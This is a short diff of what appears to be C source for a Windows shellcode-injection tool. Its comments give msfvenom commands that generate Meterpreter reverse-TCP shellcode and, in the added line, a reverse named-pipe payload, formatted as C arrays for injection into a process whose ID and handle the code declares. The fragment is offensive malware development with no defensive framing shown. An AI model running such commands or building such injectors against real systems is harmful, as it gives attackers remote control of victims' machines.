@@ -7,7 +7,7 @@
 
 //* to compile reverse shell, use msfvenom 
 //... in the console: msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=localhost LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
-
+//  msfvenom --platform windows -a x86 -p payload/windows/custom/reverse_named_pipe LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke003
 /* Init*/
 DWORD PID = NULL;  // process id 
 HANDLE hProcess = NULL; // process 
